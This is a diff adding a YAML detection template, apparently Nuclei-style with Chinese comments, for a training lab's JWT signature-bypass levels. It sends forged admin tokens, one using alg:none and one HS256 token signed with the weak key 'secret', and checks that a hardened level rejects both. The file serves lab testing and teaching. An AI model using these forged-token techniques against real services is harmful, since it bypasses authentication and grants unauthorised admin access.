@@ -1,0 +1,196 @@
+id: vulnlab-jwt-signature-bypass
+
+info:
+  name: JWT 签名绕过（alg:none 与弱密钥）
+  severity: critical
+  author: hediwen
+  tags: [jwt, authentication, signature-bypass, weak-secret, auth-bypass]
+
+  description: |
+    JWT 的 header 与 payload 只是 base64url 编码的明文 ——
+    任何人都能读、也能改。全部安全性都压在第三段的签名上。
+
+    本 PoC 覆盖两种最常见的失效方式：
+
+      ① **alg:none 绕过** —— 服务端把「token 声明自己没有签名」
+         当成了「那就不用校验」。改一个字段就能以任意身份通过。
+
+      ② **弱密钥伪造** —— 算法判断完全正确，但密钥是 `secret`。
+         攻击者猜到密钥后能算出**数学上完全合法**的签名，
+         校验逻辑毫发无损，token 却完全是自己写的。
+
+    这两种问题的性质完全不同（一个是逻辑问题、一个是配置问题），
+    所以修复也必须分别针对，缺一不可。
+
+    ── 本检测不触碰任何真实凭据 ──
+
+    载荷里的 `user` / `role` 都是靶场演示值，通关凭证是靶场自带的固定串。
+    本检测**不尝试登录、不猜测真实账号密码、不发起枚举** ——
+    它只验证「签名校验能不能被绕过」这一件事。
+    真实授权测试中，JWT 类检测应当在拿到一个合法 token 之后进行，
+    并明确记录用了哪个账号的 token。
+
+  reference:
+    - https://datatracker.ietf.org/doc/html/rfc7519
+    - https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens
+    - https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/  # alg:none 的经典披露
+
+requests:
+  # ── ① low 档：alg:none ──────────────────────────────────────────
+  #
+  # token 拆开看：
+  #
+  #   eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0             ← {"alg":"none","typ":"JWT"}
+  #   eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ     ← {"user":"alice","role":"admin"}
+  #   （空）                                          ← 签名为空串，规范允许
+  #
+  # 注意第三段是**空的** —— token 以 `.` 结尾。
+  # 这不是格式错误，而是 JWT 规范对 alg:none 的规定。
+  #
+  # 服务端看到 alg=none 就走进「没有签名可校验」的分支并放行 ——
+  # 而正确的处理是**拒绝这个 token**。
+  # 「我无法验证它」不等于「它是可信的」。
+  - method: POST
+    path:
+      - "{{BaseURL}}/jwt/low.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "action=verify&token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ."
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      # 通关凭证只在「校验通过 + 角色是 admin」时渲染
+      - type: word
+        part: body
+        words:
+          - "VULNLAB{jwt_signature_bypass}"
+
+      # 反向保险：被拒绝的响应不算命中
+      # 负向判据只认「结论句」，不认「词汇」
+      #
+      # ⚠️ 这里踩过一个坑：最初写的是 words: ["签名不匹配", ...]，
+      #    结果 medium 档的**说明性文字**里也出现了「签名不匹配」四个字
+      #    （原文是「alg:none 会被拒、签名不匹配会被拒」），
+      #    于是真实命中的响应被负向判据否掉了。
+      #
+      # 教训：**关键词不等于语义。** 页面会用这些词来描述防护，
+      # 也会用它们来描述失败 —— 两者在文本上无法区分。
+      # 唯一可靠的负向信号，是那句只在失败分支里渲染的结论句。
+      - type: word
+        part: body
+        words:
+          - "token 未通过校验"
+        negative: true
+
+    extractors:
+      # 把伪造用的 header 抠出来，便于报告里说明「用的是哪种绕过」
+      - type: regex
+        part: body
+        name: forged_header
+        regex:
+          - '\{"alg":"none","typ":"JWT"\}'
+
+  # ── ② medium 档：弱密钥伪造 ─────────────────────────────────────
+  #
+  # 这一档的算法判断是**正确的**（alg:none 会被拒），
+  # 签名也确实在比对。所以这里换一条路：猜密钥。
+  #
+  # 密钥是 `secret` —— 出现在几乎每一份 JWT 教程和脚手架配置里。
+  # 攻击者不需要「猜」，直接拿常见密钥列表逐个试即可
+  # （靶场自带 html/jwt/wordlist.txt，31 条命中）。
+  #
+  # 拿到密钥后，用它对伪造的 payload 重算签名 ——
+  # 得到的 token 在服务端看来**完全合法**。
+  #
+  # ⚠️ 注意这一条的性质和 ① 完全不同：
+  #    ① 是校验逻辑有洞；② 是校验逻辑没洞，但密钥是空门。
+  - method: POST
+    path:
+      - "{{BaseURL}}/jwt/medium.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "action=verify&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ.sD10eZTjngoTLbVGXU5imTkW4aUARFgTWCoTsW6ww50"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "VULNLAB{jwt_signature_bypass}"
+
+      # 同 ①：「签名不匹配」在 medium 档页面里是说明性词汇，
+      #     不能直接当负向特征用 —— 只认失败分支才渲染的结论句。
+      - type: word
+        part: body
+        words:
+          - "token 未通过校验"
+        negative: true
+
+    extractors:
+      - type: regex
+        part: body
+        name: forged_payload
+        regex:
+          - '\{"user":"alice","role":"admin"\}'
+
+  # ── ③ high 档：修复对照（预期不命中）───────────────────────────
+  #
+  # 同一条 alg:none 载荷打过去，high 档的算法白名单会直接拒绝 ——
+  # 它用的是「只列举支持的算法」而不是「除了 none 都放过」。
+  #
+  # 这一条如果命中了，说明白名单被改成了黑名单。
+  - method: POST
+    path:
+      - "{{BaseURL}}/jwt/high.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "action=verify&token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ."
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "VULNLAB{jwt_signature_bypass}"
+
+      - type: word
+        part: body
+        words:
+          - "token 未通过校验"
+        negative: true
+
+  # ── ④ high 档：弱密钥手法也应被拒（预期不命中）─────────────────
+  #
+  # 这一条验证的是「密钥强度也修了」——
+  # 只修算法判断、不换密钥，high 档就会退回 medium 的水平。
+  - method: POST
+    path:
+      - "{{BaseURL}}/jwt/high.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "action=verify&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoiYWRtaW4ifQ.sD10eZTjngoTLbVGXU5imTkW4aUARFgTWCoTsW6ww50"
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+
+      - type: word
+        part: body
+        words:
+          - "VULNLAB{jwt_signature_bypass}"
+
+      - type: word
+        part: body
+        words:
+          - "token 未通过校验"
+        negative: true
